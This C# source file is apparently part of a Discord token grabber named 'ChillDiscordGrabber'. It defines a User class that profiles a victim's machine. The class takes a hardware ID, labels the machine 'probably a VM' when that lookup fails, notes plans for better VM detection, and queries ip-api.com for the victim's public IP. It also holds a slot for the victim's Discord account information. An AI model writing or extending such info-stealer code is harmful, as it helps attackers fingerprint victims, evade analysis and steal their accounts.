using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.Net;
using Newtonsoft.Json;

namespace ChillDiscordGrabber
{
    class User
    {
        public string UUID;
        public string IP;
        public DiscordInfo discordInfo = new DiscordInfo();

        static string GetIP()
        {
            try
            {
                string IpInfo = new WebClient().DownloadString("http://ip-api.com/json/");
                return JsonConvert.DeserializeObject<dynamic>(IpInfo)["query"];
            }
            catch { return "Unknown"; }
        }

        public User()
        {
            try
            {
                UUID = libc.hwid.HwId.Generate();
            }
            catch
            {
                UUID = "This is probably a VM";
                //TODO: Implement something based on neofetch + some .NET apis....
                //or to edit the library used to get UUIDs
            }
            IP = GetIP();
        }
    }



}
